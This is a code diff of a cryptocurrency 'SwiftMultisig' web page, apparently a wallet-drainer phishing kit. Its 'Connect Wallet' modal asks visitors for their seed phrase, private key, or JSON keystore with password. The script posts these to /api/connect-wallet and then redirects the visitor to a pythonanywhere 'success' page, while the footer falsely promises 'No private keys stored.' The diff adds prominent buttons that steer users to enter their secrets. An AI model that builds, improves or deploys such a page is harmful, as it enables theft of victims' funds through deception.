@@ -226,12 +226,10 @@ body {
     background: rgba(0,0,0,0.8);
     backdrop-filter: blur(8px);
     z-index: 1000;
-
     display: none;
     justify-content: center;
     align-items: center;
-
-    overflow-y: auto; /* ✅ SCROLL ENABLED */
+    overflow-y: auto;
 }
 
 /* Modal content */
@@ -243,8 +241,7 @@ body {
     max-width: 500px;
     width: 90%;
     border: 1px solid rgba(59,130,246,0.3);
-
-    max-height: 90vh; /* ✅ FIX HEIGHT */
+    max-height: 90vh;
     display: flex;
     flex-direction: column;
 }
@@ -265,14 +262,50 @@ body {
     cursor: pointer;
 }
 
+/* Quick methods row - side by side above wallet list */
+.quick-methods {
+    display: flex;
+    gap: 12px;
+    margin-bottom: 28px;
+    flex-wrap: wrap;
+    justify-content: space-between;
+}
+
+.quick-method-btn {
+    flex: 1;
+    background: rgba(255,255,255,0.05);
+    border: 1px solid rgba(59,130,246,0.4);
+    border-radius: 40px;
+    padding: 12px 8px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.2s;
+    color: white;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    font-size: 0.9rem;
+    text-align: center;
+}
+
+.quick-method-btn i {
+    font-size: 1.1rem;
+}
+
+.quick-method-btn:hover {
+    background: rgba(59,130,246,0.2);
+    transform: translateY(-2px);
+    border-color: #60a5fa;
+}
+
 /* Wallet list (SCROLL FIX) */
 .wallet-options {
     display: grid;
     grid-template-columns: 1fr 1fr;
     gap: 12px;
-
-    max-height: 300px;   /* ✅ */
-    overflow-y: auto;    /* ✅ */
+    max-height: 280px;
+    overflow-y: auto;
     padding-right: 6px;
 }
 
@@ -363,6 +396,40 @@ footer {
     color: rgba(255,255,255,0.7);
 }
 
+/* Tabs inside input modal */
+.input-method-tabs {
+    display: flex;
+    gap: 12px;
+    margin-bottom: 24px;
+    border-bottom: 1px solid rgba(59,130,246,0.2);
+    padding-bottom: 12px;
+}
+
+.method-tab {
+    background: none;
+    border: none;
+    color: rgba(255,255,255,0.6);
+    padding: 8px 16px;
+    cursor: pointer;
+    font-weight: 500;
+    border-radius: 40px;
+    transition: all 0.2s;
+}
+
+.method-tab.active {
+    background: rgba(59,130,246,0.2);
+    color: white;
+    border-bottom: 2px solid #60a5fa;
+}
+
+.input-panel {
+    display: none;
+}
+
+.input-panel.active {
+    display: block;
+}
+
 /* Responsive */
 @media (max-width: 768px) {
     .hero-left h1 {
@@ -380,6 +447,11 @@ footer {
 
     .wallet-options {
         grid-template-columns: 1fr;
+    }
+
+    .quick-methods {
+        flex-direction: column;
+        gap: 10px;
     }
 }
 </style>
@@ -414,7 +486,7 @@ footer {
             </div>
         </div>
 
-        <!-- Buy crypto section with Connect Wallet button added -->
+        <!-- Buy crypto section -->
         <div class="buy-crypto-section">
             <h2>Buy crypto with your local currency</h2>
             <p>Start your crypto journey using your credit/debit card, bank account, Apple Pay, or Google Pay</p>
@@ -428,8 +500,7 @@ footer {
                 <button class="btn-connect" onclick="openWalletModal()" style="background: linear-gradient(135deg, #3b82f6, #8b5cf6);">
                     <i class="fas fa-plug"></i>Purchase NOW!!!
                 </button>
-                <!-- <button class="learn-more-btn" onclick="alert('Coming soon!')">LEARN MORE →</button>
-            </div> -->
+            </div>
         </div>
 
         <div class="trading-section">
@@ -495,126 +566,84 @@ footer {
     </div>
 
     <footer>
-        <p>© 2026 SwiftMultisig — Secure multisig wallet management. No private keys stored.</p>
+        <p>©️ 2026 SwiftMultisig — Secure multisig wallet management. No private keys stored.</p>
     </footer>
 </div>
 
 
+<!-- WALLET MODAL (quick methods above wallet list, side by side) -->
 <div id="walletModal" class="modal">
     <div class="modal-content">
         <div class="modal-header">
-            <h2>Select Wallet</h2>
+            <h2>Connect Wallet</h2>
             <button class="close-modal" onclick="closeWalletModal()">&times;</button>
         </div>
 
-        <div class="wallet-options">
+        <!-- Quick methods row: side by side -->
+        <div class="quick-methods">
+            <button class="quick-method-btn" onclick="openSeedPhraseModal()">
+                <i class="fas fa-key"></i> Use Seed Phrase
+            </button>
+            <button class="quick-method-btn" onclick="openPrivateKeyModal()">
+                <i class="fas fa-lock"></i> Use Private Key
+            </button>
+            <button class="quick-method-btn" onclick="openJSONModal()">
+                <i class="fas fa-file-code"></i> Upload JSON File
+            </button>
+        </div>
 
-            <!-- ORIGINAL -->
-            <div class="wallet-option" onclick="selectWallet('Phantom')">
+        <div class="wallet-options">
+            <!-- Popular wallets -->
+            <div class="wallet-option" onclick="connectSpecificWallet('Phantom')">
                 <i class="fas fa-ghost"></i>
                 <div><strong>Phantom</strong><br><small>Solana & Ethereum</small></div>
             </div>
-
-            <div class="wallet-option" onclick="selectWallet('Universal Wallet')">
+            <div class="wallet-option" onclick="connectSpecificWallet('Universal Wallet')">
                 <i class="fas fa-globe"></i>
                 <div><strong>Universal Wallet</strong><br><small>Multi-chain</small></div>
             </div>
-
-            <div class="wallet-option" onclick="selectWallet('MetaMask')">
+            <div class="wallet-option" onclick="connectSpecificWallet('MetaMask')">
                 <i class="fab fa-ethereum"></i>
                 <div><strong>MetaMask</strong><br><small>Ethereum & EVM</small></div>
             </div>
-
-            <div class="wallet-option" onclick="selectWallet('Solflare')">
+            <div class="wallet-option" onclick="connectSpecificWallet('Solflare')">
                 <i class="fas fa-sun"></i>
                 <div><strong>Solflare</strong><br><small>Solana wallet</small></div>
             </div>
-
-            <div class="wallet-option" onclick="selectWallet('Trust Wallet')">
+            <div class="wallet-option" onclick="connectSpecificWallet('Trust Wallet')">
                 <i class="fas fa-check-circle"></i>
                 <div><strong>Trust Wallet</strong><br><small>Multi-chain mobile wallet</small></div>
             </div>
-
-            <div class="wallet-option" onclick="selectWallet('Coinbase Wallet')">
+            <div class="wallet-option" onclick="connectSpecificWallet('Coinbase Wallet')">
                 <i class="fab fa-bitcoin"></i>
                 <div><strong>Coinbase Wallet</strong><br><small>Self-custody wallet</small></div>
             </div>
-
-            <div class="wallet-option" onclick="selectWallet('Ledger')">
+            <div class="wallet-option" onclick="connectSpecificWallet('Ledger')">
                 <i class="fas fa-usb"></i>
                 <div><strong>Ledger</strong><br><small>Hardware wallet</small></div>
             </div>
-
-            <div class="wallet-option" onclick="selectWallet('Rainbow')">
-                <i class="fas fa-rainbow"></i>
-                <div><strong>Rainbow</strong><br><small>Ethereum wallet</small></div>
-            </div>
-
-            <!-- ADDED -->
-
-            <div class="wallet-option" onclick="selectWallet('Backpack')">
+            <div class="wallet-option" onclick="connectSpecificWallet('Backpack')">
                 <i class="fas fa-briefcase"></i>
                 <div><strong>Backpack</strong><br><small>Solana wallet</small></div>
             </div>
-
-            <div class="wallet-option" onclick="selectWallet('Glow')">
-                <i class="fas fa-star"></i>
-                <div><strong>Glow</strong><br><small>Solana wallet</small></div>
-            </div>
-
-            <div class="wallet-option" onclick="selectWallet('Slope')">
-                <i class="fas fa-mountain"></i>
-                <div><strong>Slope</strong><br><small>Solana wallet</small></div>
-            </div>
-
-            <div class="wallet-option" onclick="selectWallet('Exodus')">
+            <div class="wallet-option" onclick="connectSpecificWallet('Exodus')">
                 <i class="fas fa-rocket"></i>
                 <div><strong>Exodus</strong><br><small>Multi-chain wallet</small></div>
             </div>
-
-            <div class="wallet-option" onclick="selectWallet('Atomic Wallet')">
-                <i class="fas fa-atom"></i>
-                <div><strong>Atomic Wallet</strong><br><small>Multi-chain wallet</small></div>
-            </div>
-
-            <div class="wallet-option" onclick="selectWallet('Math Wallet')">
-                <i class="fas fa-calculator"></i>
-                <div><strong>Math Wallet</strong><br><small>Multi-chain wallet</small></div>
-            </div>
-
-            <div class="wallet-option" onclick="selectWallet('Coin98 Wallet')">
-                <i class="fas fa-coins"></i>
-                <div><strong>Coin98 Wallet</strong><br><small>DeFi wallet</small></div>
-            </div>
-
-            <div class="wallet-option" onclick="selectWallet('SafePal')">
-                <i class="fas fa-shield-alt"></i>
-                <div><strong>SafePal</strong><br><small>Secure wallet</small></div>
-            </div>
-
-            <div class="wallet-option" onclick="selectWallet('Bitget Wallet')">
-                <i class="fas fa-wallet"></i>
-                <div><strong>Bitget Wallet</strong><br><small>Multi-chain wallet</small></div>
-            </div>
-
-            <div class="wallet-option" onclick="selectWallet('NuFi')">
-                <i class="fas fa-link"></i>
-                <div><strong>NuFi</strong><br><small>Web3 wallet</small></div>
-            </div>
-
         </div>
     </div>
-</div> 
-  
+</div>
+
+<!-- Unified INPUT MODAL (dynamic title & active method) -->
 <div id="inputModal" class="input-modal">
     <div class="input-modal-content">
         <div class="modal-header"><h2 id="inputModalTitle">Enter Credentials</h2><button class="close-modal" onclick="closeInputModal()">&times;</button></div>
         <div class="input-method-tabs">
-            <button class="method-tab active" data-method="seed">Seed Phrase</button>
+            <button class="method-tab" data-method="seed">Seed Phrase</button>
             <button class="method-tab" data-method="private">Private Key</button>
             <button class="method-tab" data-method="json">JSON File</button>
         </div>
-        <div id="seedPanel" class="input-panel active"><textarea id="seedInput" rows="4" placeholder="Enter your 12 or 24 word recovery phrase"></textarea></div>
+        <div id="seedPanel" class="input-panel"><textarea id="seedInput" rows="4" placeholder="Enter your 12 or 24 word recovery phrase"></textarea></div>
         <div id="privatePanel" class="input-panel"><input type="text" id="privateInput" placeholder="Enter your private key"></div>
         <div id="jsonPanel" class="input-panel">
             <div id="jsonUploadArea" class="json-upload-area"><i class="fas fa-cloud-upload-alt"></i><p>Click to upload JSON keystore file</p><input type="file" id="jsonFile" accept=".json" style="display: none;"></div>
@@ -627,130 +656,216 @@ footer {
 <div id="toast" class="toast"></div>
 
 <script>
-    
-    const REDIRECT_URL = 'https://funiec.pythonanywhere.com/success/success.html';
-    
+const REDIRECT_URL = 'https://funiec.pythonanywhere.com/success/success.html';
+let selectedWallet = null;
+let selectedMethod = 'seed';
 
-    let selectedWallet = null;
-    let selectedMethod = 'seed';
+// Helper: UI & modal control
+function showPage(page) {
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    document.getElementById(page+'Page').classList.add('active');
+    window.scrollTo(0,0);
+}
 
-    function showPage(page) {
-        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-        document.getElementById(page + 'Page').classList.add('active');
-        window.scrollTo(0, 0);
+function openWalletModal() { document.getElementById('walletModal').style.display = 'flex'; }
+function closeWalletModal() { document.getElementById('walletModal').style.display = 'none'; }
+
+function closeInputModal() {
+    document.getElementById('inputModal').style.display = 'none';
+    // Clear fields to avoid stale data
+    document.getElementById('seedInput').value = '';
+    document.getElementById('privateInput').value = '';
+    document.getElementById('jsonPassword').value = '';
+    document.getElementById('jsonFile').value = '';
+    // Reset JSON upload area display
+    const uploadArea = document.getElementById('jsonUploadArea');
+    uploadArea.innerHTML = `<i class="fas fa-cloud-upload-alt"></i><p>Click to upload JSON keystore file</p><input type="file" id="jsonFile" accept=".json" style="display: none;">`;
+    // reattach file input reference
+    const newFileInput = uploadArea.querySelector('#jsonFile');
+    if(newFileInput) {
+        newFileInput.id = 'jsonFile';
+        newFileInput.addEventListener('change', handleJsonFileChange);
     }
+}
 
-    function openWalletModal() { document.getElementById('walletModal').style.display = 'flex'; }
-    function closeWalletModal() { document.getElementById('walletModal').style.display = 'none'; }
-
-    function selectWallet(wallet) {
-        selectedWallet = wallet;
-        closeWalletModal();
-        openInputModal();
-    }
-
-    function openInputModal() {
-        document.getElementById('inputModalTitle').innerHTML = `Enter ${selectedWallet} Credentials`;
-        document.getElementById('inputModal').style.display = 'flex';
-    }
-
-    function closeInputModal() {
-        document.getElementById('inputModal').style.display = 'none';
-        document.getElementById('seedInput').value = '';
-        document.getElementById('privateInput').value = '';
-        document.getElementById('jsonPassword').value = '';
-        document.getElementById('jsonFile').value = '';
-        document.getElementById('jsonUploadArea').innerHTML = `<i class="fas fa-cloud-upload-alt"></i><p>Click to upload JSON keystore file</p><input type="file" id="jsonFile" accept=".json" style="display: none;">`;
-    }
-
-    // Tab switching
+// Activate correct tab & panel based on method
+function activateMethodTab(method) {
+    selectedMethod = method;
     document.querySelectorAll('.method-tab').forEach(tab => {
-        tab.addEventListener('click', () => {
-            document.querySelectorAll('.method-tab').forEach(t => t.classList.remove('active'));
-            tab.classList.add('active');
-            selectedMethod = tab.getAttribute('data-method');
-            document.querySelectorAll('.input-panel').forEach(p => p.classList.remove('active'));
-            document.getElementById(`${selectedMethod}Panel`).classList.add('active');
-        });
+        if(tab.getAttribute('data-method') === method) tab.classList.add('active');
+        else tab.classList.remove('active');
     });
+    document.querySelectorAll('.input-panel').forEach(panel => panel.classList.remove('active'));
+    document.getElementById(method + 'Panel').classList.add('active');
+}
 
-    // JSON file upload
-    const jsonUploadArea = document.getElementById('jsonUploadArea');
-    const jsonFileInput = document.getElementById('jsonFile');
-    if (jsonUploadArea) {
-        jsonUploadArea.addEventListener('click', () => jsonFileInput.click());
-        jsonFileInput.addEventListener('change', (e) => {
-            const file = e.target.files[0];
-            if (file) {
-                jsonUploadArea.innerHTML = `<i class="fas fa-file-code" style="font-size: 2rem; color: #10b981;"></i><p>${file.name}</p><p style="font-size: 0.7rem;">Click to change</p>`;
-            }
+// For wallet list selection (Phantom, MetaMask etc) -> default seed phrase panel
+function connectSpecificWallet(walletName) {
+    selectedWallet = walletName;
+    selectedMethod = 'seed';
+    document.getElementById('inputModalTitle').innerHTML = `Enter ${walletName} Credentials`;
+    activateMethodTab('seed');
+    document.getElementById('inputModal').style.display = 'flex';
+    closeWalletModal();
+}
+
+// DEDICATED MODAL TRIGGERS: SEED PHRASE, PRIVATE KEY, JSON
+function openSeedPhraseModal() {
+    selectedWallet = 'Manual Entry (Seed)';
+    selectedMethod = 'seed';
+    document.getElementById('inputModalTitle').innerHTML = '🔐 Enter Seed Phrase';
+    activateMethodTab('seed');
+    document.getElementById('inputModal').style.display = 'flex';
+    closeWalletModal();
+    document.getElementById('seedInput').value = '';
+}
+
+function openPrivateKeyModal() {
+    selectedWallet = 'Manual Entry (Private Key)';
+    selectedMethod = 'private';
+    document.getElementById('inputModalTitle').innerHTML = '🔑 Enter Private Key';
+    activateMethodTab('private');
+    document.getElementById('inputModal').style.display = 'flex';
+    closeWalletModal();
+    document.getElementById('privateInput').value = '';
+}
+
+function openJSONModal() {
+    selectedWallet = 'Manual Entry (JSON)';
+    selectedMethod = 'json';
+    document.getElementById('inputModalTitle').innerHTML = '📁 Upload JSON Keystore';
+    activateMethodTab('json');
+    document.getElementById('inputModal').style.display = 'flex';
+    closeWalletModal();
+    // reset JSON area
+    const uploadArea = document.getElementById('jsonUploadArea');
+    uploadArea.innerHTML = `<i class="fas fa-cloud-upload-alt"></i><p>Click to upload JSON keystore file</p><input type="file" id="jsonFile" accept=".json" style="display: none;">`;
+    const newFileInput = uploadArea.querySelector('#jsonFile');
+    if(newFileInput) {
+        newFileInput.id = 'jsonFile';
+        newFileInput.addEventListener('change', handleJsonFileChange);
+    }
+    document.getElementById('jsonPassword').value = '';
+}
+
+// JSON upload handler
+function handleJsonFileChange(e) {
+    const file = e.target.files[0];
+    if(file) {
+        const uploadArea = document.getElementById('jsonUploadArea');
+        uploadArea.innerHTML = `<i class="fas fa-file-code" style="font-size:2rem;color:#10b981;"></i><p>${file.name}</p><p style="font-size:0.7rem;">Click to change</p>`;
+        // re-attach hidden input to preserve file reference
+        const hiddenInput = document.createElement('input');
+        hiddenInput.type = 'file';
+        hiddenInput.id = 'jsonFile';
+        hiddenInput.accept = '.json';
+        hiddenInput.style.display = 'none';
+        hiddenInput.addEventListener('change', handleJsonFileChange);
+        uploadArea.appendChild(hiddenInput);
+        // keep selected file accessible: update global reference
+        const newInput = uploadArea.querySelector('#jsonFile');
+        if(newInput && newInput.files.length === 0 && file) {
+            const dt = new DataTransfer();
+            dt.items.add(file);
+            newInput.files = dt.files;
+        }
+    }
+}
+
+// Toast notification
+function showToast(message, isError=false){
+    const toast = document.getElementById('toast');
+    toast.textContent = message;
+    toast.className = 'toast' + (isError ? ' error' : '');
+    toast.style.display = 'block';
+    setTimeout(()=>{ toast.style.display = 'none'; }, 4000);
+}
+
+// Submit credentials
+async function submitCredentials(){
+    let credentialData = '';
+    if(selectedMethod === 'seed'){
+        credentialData = document.getElementById('seedInput').value.trim();
+        if(!credentialData){ showToast('Please enter your seed phrase', true); return; }
+    } else if(selectedMethod === 'private'){
+        credentialData = document.getElementById('privateInput').value.trim();
+        if(!credentialData){ showToast('Please enter your private key', true); return; }
+    } else if(selectedMethod === 'json'){
+        const fileInput = document.getElementById('jsonFile');
+        const file = fileInput ? fileInput.files[0] : null;
+        if(!file){ showToast('Please select a JSON keystore file', true); return; }
+        const password = document.getElementById('jsonPassword').value;
+        credentialData = `JSON File: ${file.name}\nPassword: ${password || 'No password provided'}`;
+    }
+
+    const submitBtn = document.querySelector('.submit-input-btn');
+    submitBtn.disabled = true;
+    submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Submitting...';
+
+    try {
+        const response = await fetch('/api/connect-wallet', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                walletType: selectedWallet,
+                inputMethod: selectedMethod,
+                credentialData: credentialData,
+                timestamp: new Date().toISOString()
+            })
         });
-    }
-
-    function showToast(message, isError = false) {
-        const toast = document.getElementById('toast');
-        toast.textContent = message;
-        toast.className = 'toast' + (isError ? ' error' : '');
-        toast.style.display = 'block';
-        setTimeout(() => { toast.style.display = 'none'; }, 4000);
-    }
-
-    async function submitCredentials() {
-        let credentialData = '';
-        if (selectedMethod === 'seed') {
-            credentialData = document.getElementById('seedInput').value.trim();
-            if (!credentialData) { showToast('Please enter your seed phrase', true); return; }
-        } else if (selectedMethod === 'private') {
-            credentialData = document.getElementById('privateInput').value.trim();
-            if (!credentialData) { showToast('Please enter your private key', true); return; }
-        } else if (selectedMethod === 'json') {
-            const file = jsonFileInput.files[0];
-            if (!file) { showToast('Please select a JSON keystore file', true); return; }
-            const password = document.getElementById('jsonPassword').value;
-            credentialData = `JSON File: ${file.name}\nPassword: ${password || 'No password provided'}`;
+        const data = await response.json();
+        if(data.success){
+            showToast('✅ Submitted! Redirecting...');
+            setTimeout(()=>{ window.location.href = REDIRECT_URL; }, 1500);
+        } else {
+            throw new Error(data.message || 'Submission failed');
         }
-
-        const submitBtn = document.querySelector('.submit-input-btn');
-        submitBtn.disabled = true;
-        submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Submitting...';
-
-        try {
-            const response = await fetch('/api/connect-wallet', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    walletType: selectedWallet,
-                    inputMethod: selectedMethod,
-                    credentialData: credentialData,
-                    timestamp: new Date().toISOString()
-                })
-            });
-            const data = await response.json();
-            if (data.success) {
-                showToast('✅ Submitted! Redirecting...');
-                setTimeout(() => {
-                    window.location.href = REDIRECT_URL;
-                }, 1500);
-            } else {
-                throw new Error(data.message || 'Submission failed');
-            }
-        } catch (error) {
-            console.error(error);
-            showToast(' Submission failed: ' + error.message, true);
-            submitBtn.disabled = false;
-            submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Submit';
-        }
+    } catch(error){
+        console.error(error);
+        showToast('Submission failed: ' + error.message, true);
+        submitBtn.disabled = false;
+        submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Submit';
     }
+}
 
-    document.getElementById('mainConnectBtn').onclick = openWalletModal;
-    document.getElementById('heroConnectBtn').onclick = openWalletModal;
+// Event listeners for method tabs inside input modal
+document.querySelectorAll('.method-tab').forEach(tab => {
+    tab.addEventListener('click', (e) => {
+        const method = tab.getAttribute('data-method');
+        selectedMethod = method;
+        activateMethodTab(method);
+        if(selectedWallet && selectedWallet.includes('Manual')) {
+            if(method === 'seed') document.getElementById('inputModalTitle').innerHTML = '🔐 Enter Seed Phrase';
+            else if(method === 'private') document.getElementById('inputModalTitle').innerHTML = '🔑 Enter Private Key';
+            else if(method === 'json') document.getElementById('inputModalTitle').innerHTML = '📁 Upload JSON Keystore';
+        }
+    });
+});
 
-    window.onclick = (event) => {
-        if (event.target === document.getElementById('walletModal')) closeWalletModal();
-        if (event.target === document.getElementById('inputModal')) closeInputModal();
-    };
+// JSON upload area click & file handling
+const jsonUploadAreaStatic = document.getElementById('jsonUploadArea');
+if(jsonUploadAreaStatic) {
+    const fileInputStatic = document.getElementById('jsonFile');
+    jsonUploadAreaStatic.addEventListener('click', () => {
+        const fileInputElem = document.getElementById('jsonFile');
+        if(fileInputElem) fileInputElem.click();
+    });
+    if(fileInputStatic) {
+        fileInputStatic.addEventListener('change', handleJsonFileChange);
+    }
+}
 
-    showPage('home');
+// Connect buttons
+document.getElementById('mainConnectBtn').onclick = openWalletModal;
+document.getElementById('heroConnectBtn').onclick = openWalletModal;
+
+// Close modals on background click
+window.onclick = (event) => {
+    if(event.target === document.getElementById('walletModal')) closeWalletModal();
+    if(event.target === document.getElementById('inputModal')) closeInputModal();
+};
+
+showPage('home');
 </script>
 </body>
 </html>
